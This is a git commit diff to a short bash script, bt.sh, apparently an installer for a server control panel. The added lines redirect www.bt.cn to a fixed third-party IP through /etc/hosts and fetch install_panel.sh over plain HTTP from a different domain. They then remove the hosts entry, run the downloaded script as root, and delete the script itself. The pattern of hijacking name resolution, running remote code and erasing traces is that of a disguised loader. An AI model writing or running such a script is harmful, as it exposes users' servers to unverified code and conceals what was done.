f5e31c8b92a454b56ec3455db785445db4990be6
feiyu201 <77211066+feiyu201@users.noreply.github.com>
2022-03-31 03:46:45 +0800

    Update bt.sh

--- bt.sh
+++ bt.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
 echo "51.81.230.243 www.bt.cn" >> /etc/hosts
 source /etc/hosts
-sleep 2s
-
+sleep 60
+wget http://www.bt.com/bt/install_panel.sh
+sed -i "/bt.cn/d" /etc/hosts
+bash install_panel.sh
+unlink $0
